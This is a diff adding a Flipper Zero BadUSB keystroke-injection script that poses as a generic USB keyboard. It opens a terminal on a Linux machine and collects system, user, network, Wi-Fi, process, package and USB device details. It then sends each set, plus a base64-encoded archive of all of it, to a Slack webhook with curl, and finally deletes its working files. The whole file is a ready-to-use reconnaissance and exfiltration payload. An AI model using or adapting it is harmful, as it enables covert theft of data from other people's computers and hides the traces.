@@ -1,0 +1,101 @@
+ID 1234:abcd Generic:USB Keyboard
+
+REM Flipper Zero BadUSB Script with Slack Exfiltration of Command Outputs
+
+REM Exit any overview mode
+ESC
+DELAY 200
+
+REM Open the run prompt and launch gnome-terminal
+ALT F2
+DELAY 1000
+STRING gnome-terminal
+ENTER
+DELAY 1500
+
+REM Create working directory for data collection
+STRING mkdir -p /tmp/recon
+ENTER
+DELAY 500
+
+REM -------------------------------
+REM Collect and Exfiltrate System Information
+REM -------------------------------
+STRING uname -a > /tmp/recon/sysinfo.txt && lsb_release -a >> /tmp/recon/sysinfo.txt 2>/dev/null && cat /etc/os-release >> /tmp/recon/sysinfo.txt 2>/dev/null
+ENTER
+DELAY 500
+STRING curl -X POST -H 'Content-type: application/json' --data "{\"text\": $(cat /tmp/recon/sysinfo.txt | jq -Rs .)}" https://hooks.slack.com/services/<<YOUR SLACK WEBHOOKS STUFF>>
+ENTER
+DELAY 500
+
+REM -------------------------------
+REM Collect and Exfiltrate User & Group Information
+REM -------------------------------
+STRING whoami > /tmp/recon/userinfo.txt && id >> /tmp/recon/userinfo.txt && groups >> /tmp/recon/userinfo.txt
+ENTER
+DELAY 500
+STRING curl -X POST -H 'Content-type: application/json' --data "{\"text\": $(cat /tmp/recon/userinfo.txt | jq -Rs .)}" https://hooks.slack.com/services/<<YOUR SLACK WEBHOOKS STUFF>>
+ENTER
+DELAY 500
+
+REM -------------------------------
+REM Collect and Exfiltrate Network Information & Wi-Fi List
+REM -------------------------------
+STRING ifconfig > /tmp/recon/network.txt && ip a >> /tmp/recon/network.txt && netstat -tunlp >> /tmp/recon/network.txt && nmcli device wifi list > /tmp/recon/wifi.txt
+ENTER
+DELAY 500
+STRING curl -X POST -H 'Content-type: application/json' --data "{\"text\": $(cat /tmp/recon/network.txt | jq -Rs .)}" https://hooks.slack.com/services/<<YOUR SLACK WEBHOOKS STUFF>>
+ENTER
+DELAY 500
+STRING curl -X POST -H 'Content-type: application/json' --data "{\"text\": $(cat /tmp/recon/wifi.txt | jq -Rs .)}" https://hooks.slack.com/services/<<YOUR SLACK WEBHOOKS STUFF>>
+ENTER
+DELAY 500
+
+REM -------------------------------
+REM Collect and Exfiltrate Running Processes
+REM -------------------------------
+STRING ps aux > /tmp/recon/processes.txt
+ENTER
+DELAY 500
+STRING curl -X POST -H 'Content-type: application/json' --data "{\"text\": $(cat /tmp/recon/processes.txt | jq -Rs .)}" https://hooks.slack.com/services/<<YOUR SLACK WEBHOOKS STUFF>>
+ENTER
+DELAY 500
+
+REM -------------------------------
+REM Collect and Exfiltrate Installed Packages
+REM -------------------------------
+STRING dpkg -l > /tmp/recon/packages.txt 2>/dev/null || rpm -qa > /tmp/recon/packages.txt 2>/dev/null
+ENTER
+DELAY 1000
+STRING curl -X POST -H 'Content-type: application/json' --data "{\"text\": $(cat /tmp/recon/packages.txt | jq -Rs .)}" https://hooks.slack.com/services/<<YOUR SLACK WEBHOOKS STUFF>>
+ENTER
+DELAY 500
+
+REM -------------------------------
+REM Collect and Exfiltrate USB Devices Information
+REM -------------------------------
+STRING lsusb > /tmp/recon/usb_devices.txt
+ENTER
+DELAY 500
+STRING curl -X POST -H 'Content-type: application/json' --data "{\"text\": $(cat /tmp/recon/usb_devices.txt | jq -Rs .)}" https://hooks.slack.com/services/<<YOUR SLACK WEBHOOKS STUFF>>
+ENTER
+DELAY 500
+
+REM -------------------------------
+REM Archive Collected Data and Exfiltrate Archive (Base64 Encoded)
+REM -------------------------------
+STRING tar -cvf /tmp/recon_data.tar /tmp/recon/
+ENTER
+DELAY 1000
+STRING curl -X POST -H 'Content-type: application/json' --data "{\"text\": $(base64 /tmp/recon_data.tar | jq -Rs .)}" https://hooks.slack.com/services/<<YOUR SLACK WEBHOOKS STUFF>>
+ENTER
+DELAY 1000
+
+REM -------------------------------
+REM Clean Up and Exit
+REM -------------------------------
+STRING rm -rf /tmp/recon /tmp/recon_data.tar
+ENTER
+DELAY 1000
+STRING exit
+ENTER
